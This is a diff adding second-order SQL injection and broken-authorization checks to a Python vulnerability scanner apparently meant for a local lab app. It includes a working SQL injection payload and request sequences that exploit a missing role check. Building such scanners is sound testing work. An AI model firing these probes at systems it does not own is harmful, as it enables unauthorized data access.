@@ -18,6 +18,16 @@ request shape, or a crafted binary payload instead:
               endpoint later to see if it comes back unescaped -- the
               payload doesn't need to be in the victim's own request at
               all, unlike reflected XSS.
+  second_order_sqli
+              Sign up with a payload in the PASSWORD field (stored as a
+              plain dict write, no SQL touched), then make a *second*
+              request carrying only a plain username -- the injection
+              fires there, in a request that itself contains nothing
+              malicious.
+  bfla        Log in as a non-admin user, then call an admin-only
+              function with that same valid session -- a normal
+              authenticated request; the bug is a missing role check,
+              not a payload.
 
 Scope: run only against targets you own/control, e.g. vulnerable_app.py
 in this same directory.
@@ -119,6 +129,57 @@ def check_stored_xss(args: argparse.Namespace) -> tuple[bool, str]:
 
 
 # --------------------------------------------------------------------------
+# Second-order SQLi: payload goes in at signup (no SQL touched there),
+# fires later in a different request (audit) that itself carries only a
+# plain username.
+# --------------------------------------------------------------------------
+
+SECOND_ORDER_PAYLOAD = "x' OR '1'='1"
+
+
+def check_second_order_sqli(args: argparse.Namespace) -> tuple[bool, str]:
+    probe_user = "second_order_probe_user"
+    signup_resp = requests.get(
+        f"{args.url}{args.second_order_signup_path}",
+        params={"username": probe_user, "password": SECOND_ORDER_PAYLOAD},
+        timeout=10,
+    )
+    if signup_resp.status_code != 200:
+        return False, f"signup failed (status {signup_resp.status_code}), cannot test"
+
+    # This request carries no payload at all -- just a plain username. Any
+    # injection effect here comes from the PASSWORD value stored above.
+    audit_resp = requests.get(
+        f"{args.url}{args.second_order_audit_path}", params={"username": probe_user}, timeout=10
+    )
+    if audit_resp.status_code == 200 and "admin" in audit_resp.text.lower():
+        return True, (
+            f"second-order SQLi confirmed: a value stored at signup leaked other "
+            f"users' rows from a request that itself had no payload: {audit_resp.text.strip()}"
+        )
+    return False, f"no injection effect observed (status {audit_resp.status_code}): {audit_resp.text.strip()}"
+
+
+# --------------------------------------------------------------------------
+# BFLA (broken function-level authorization): a normal, authenticated
+# non-admin session calling an admin-only function -- no payload, just a
+# missing role check.
+# --------------------------------------------------------------------------
+
+
+def check_bfla(args: argparse.Namespace) -> tuple[bool, str]:
+    s = requests.Session()
+    login_resp = s.get(f"{args.url}{args.login_path}", params={"username": args.login_as}, timeout=10)
+    if login_resp.status_code != 200:
+        return False, f"login as {args.login_as!r} failed (status {login_resp.status_code}), cannot test"
+
+    resp = s.get(f"{args.url}{args.admin_path}", timeout=10)
+    if resp.status_code == 200 and "Admin secrets" in resp.text:
+        return True, f"non-admin user {args.login_as!r} called an admin-only function: {resp.text.strip()}"
+    return False, f"access denied (status {resp.status_code}): {resp.text.strip()}"
+
+
+# --------------------------------------------------------------------------
 # Registry: add a new session/payload-shaped class here
 # --------------------------------------------------------------------------
 
@@ -152,6 +213,10 @@ CLASSES: dict[str, SessionVulnClass] = {
         ),
     ),
     "stored_xss": SessionVulnClass(check_stored_xss, "VULNERABLE", "Not vulnerable (escaped on render)"),
+    "second_order_sqli": SessionVulnClass(
+        check_second_order_sqli, "VULNERABLE", "Not vulnerable (parameterized at point of use)"
+    ),
+    "bfla": SessionVulnClass(check_bfla, "VULNERABLE", "Not vulnerable (caller's own role checked)"),
 }
 
 
@@ -193,6 +258,15 @@ def main() -> int:
     )
     parser.add_argument("--post-path", default="/review", help="stored_xss: the endpoint to POST the payload to")
     parser.add_argument("--list-path", default="/reviews", help="stored_xss: the endpoint to GET and check")
+    parser.add_argument(
+        "--second-order-signup-path", default="/second_order_signup",
+        help="second_order_sqli: the endpoint to store the payload at (no SQL touched there)",
+    )
+    parser.add_argument(
+        "--second-order-audit-path", default="/second_order_audit",
+        help="second_order_sqli: the endpoint where the stored value is later used in SQL",
+    )
+    parser.add_argument("--admin-path", default="/admin_secrets", help="bfla: the admin-only endpoint to call")
     parser.add_argument(
         "--i-own-this-target",
         action="store_true",
